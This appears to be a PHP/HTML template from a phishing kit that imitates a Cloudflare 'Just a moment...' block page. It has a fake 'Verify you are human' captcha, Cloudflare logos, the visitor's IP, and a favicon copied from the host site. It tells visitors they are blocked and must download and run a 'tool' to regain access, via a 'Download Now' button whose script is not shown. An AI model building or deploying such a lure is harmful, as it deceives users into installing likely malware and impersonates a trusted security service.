<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Just a moment...</title>

  <!-- Favicon -->
  <?php
        // Check if fetch_url is already declared before defining it
        if (!function_exists('fetch_url')) {
            function fetch_url($url) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
                curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout for faster failure handling
                $data = curl_exec($ch);
                curl_close($ch);
                return $data;
            }
        }

        function detect_favicon($domain) {
            // Fetch the HTML from the domain
            $html = fetch_url($domain);
            if ($html) {
                // Look for the favicon in the HTML
                preg_match('/<link.*?rel=["\'](?:shortcut\s)?icon["\'].*?href=["\'](.*?)["\']/', $html, $matches);
                if (!empty($matches[1])) {
                    $favicon_url = $matches[1];
                    
                    // Handle relative URLs (convert to absolute)
                    if (strpos($favicon_url, 'http') !== 0) {
                        $favicon_url = rtrim($domain, '/') . '/' . ltrim($favicon_url, '/');
                    }

                    return $favicon_url; // Return the detected favicon URL
                }
            }
            
            // If no favicon is found in the HTML, return false
            return false;
        }

        function fallback_favicon($domain) {
            // Check for /favicon.ico in the root
            $favicon_url = $domain . "/favicon.ico";
            
            // Try to fetch favicon.ico
            if (@fetch_url($favicon_url)) {
                return $favicon_url;
            }
            
            // Return false if no favicon.ico is found
            return false;
        }

        // Get the root domain (main domain)
        $host = "http://" . $_SERVER['HTTP_HOST']; // For example, "http://127.0.0.1"

        // First, try to detect favicon from HTML
        $favicon_url = detect_favicon($host);

        // If favicon not found in HTML, try /favicon.ico as a fallback
        if (!$favicon_url) {
            $favicon_url = fallback_favicon($host);
        }

        // Only add <link rel="icon"> if a favicon is found
        if ($favicon_url) {
            echo '<link rel="icon" href="' . htmlspecialchars($favicon_url) . '" type="image/x-icon">';
        }
    ?>



  <link rel="stylesheet" href="./V1_files/styles.css">
</head>
<body>

    <!-- The overlay -->
    <div id="overlay" onclick="hideoverlay()"></div>

    <!-- Captcha Section Start -->
    <div id="captcha-wrapper" class="captcha-wrapper">
      <div class="captcha-container">
        <!-- Checkbox Section -->
        <div class="captcha-content">
          <div class="checkbox-container" id="checkbox-container" onclick="play_loading()">
            <!-- <input type="checkbox" id="captcha-checkbox"> -->

            <div class="captcha-spinner" id="captcha-spinner"></div>

            <video id="video1">
              <source src="./V1_files/verify1.webm" type="video/webm">
            </video>

            <video id="video2">
              <source src="./V1_files/verify2.webm" type="video/webm">
            </video>

          </div>

          <div class="captcha-text" id="captcha-text">
            <span data-translate="verify-human">Verify you are human</span>
          </div>

        </div>

        <!-- Footer -->
        <div class="captcha-footer">
          <img class="captcha-logo" src="./V1_files/logo-cloudflare-dark.svg" alt="Cloudflare Logo">
          <div class="captcha-privacy">
            <a href="#" style="text-decoration: underline;">Privacy</a> • <a href="#" style="text-decoration: underline;">Terms</a>
          </div>
        </div>



        <!-- Error message outside the captcha box -->
        <div class="error-message" id="error-message">
          <span data-translate="issue">There was a problem, please try again.</span>
        </div>
      </div>

      <div id="submit_div">
          <button class="pre_submit_btn" id="submit_btn"><span data-translate="submit">Submit</span></button>
      </div>

    </div>
    <!-- Captcha Section End -->


    <div id="wrapper">
      <!-- <div class="alert alert-error cookie-error" id="cookie-alert" data-translate="enable_cookies"></div> -->
      <div id="error-details" class="error-details-wrapper">
        <div class="wrapper header error-overview">
          <div data-translate="block_headline" id="title">Sorry, you have been blocked</div>
          <div class="subheadline" id="warn_txt">
            <span data-translate="unable_to_access">You are unable to access</span>
            <span id="domain-name">
              <?php echo $_SERVER['HTTP_HOST'] ?>
            </span>
          </div>
        </div>
        <!-- /.header -->

        <div class="section highlight">
          <div class="wrapper">
            <div class="screenshot-container screenshot-full">
              <div id="bar"></div>
              <span class="no-screenshot error">
                <img src="./V1_files/ban.png">
              </span>
            </div>
          </div>
        </div>
        <!-- /.captcha-container -->

        <div class="section wrapper">
          <div class="columns two">
            <div class="column">
              <h2 data-translate="blocked_why_headline">Why have I been blocked?</h2>

              <p data-translate="blocked_why_detail">This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.</p>
            </div>

            <div class="column">
              <h2 data-translate="blocked_resolve_headline">What can I do to resolve this?</h2>

              <p>
                <span data-translate="blocked_resolve_detail">Cloudflare offers a user-friendly tool to help unblock your IP address. Simply download the tool, run it with a single click, and you'll regain access to the website you're trying to visit.</span>
                <button class="download-btn" id="donwload_btn">
                <span data-translate="download_now">Download Now</span>
                </button>
              </p>
            </div>
          </div>
        </div>
        <!-- /.section -->


        <div class="error-footer wrapper w-240 lg:w-full py-10 sm:py-4 sm:px-8 mx-auto text-center sm:text-left border-solid border-0 border-t border-gray-300">
          <p class="text-13">
            <span class="footer-item sm:block sm:mb-1"><span data-translate="ray_id">Cloudflare Ray ID:</span>
              <strong class="font-semibold" id="ray-id"></strong>
            </span>
            <span class="footer-separator sm:hidden">•</span>
            <span id="footer-item-ip" class="footer-item sm:block sm:mb-1">
              <span data-translate="your_ip">Your IP:</span>
              <span id="footer-ip" class="ip-address">
                <?php echo $_SERVER['REMOTE_ADDR'] ?>
              </span>
            </span>
            <span class="footer-separator sm:hidden">•</span>
            <span class="footer-item sm:block sm:mb-1"><span data-translate="performance_security">Performance &amp; security by</span>
              <a rel="noopener noreferrer" href="" id="brand_link" target="_blank">Cloudflare</a></span>
          </p>
        </div>

        <!-- /.error-footer -->
      </div>
      <!-- /#error-details -->
    </div>
    <!-- /#wrapper -->
    
  <script type="text/javascript" src="./V1_files/jquery.min.js"></script>
  <script src="./V1_files/script.js"></script>

</body>
</html>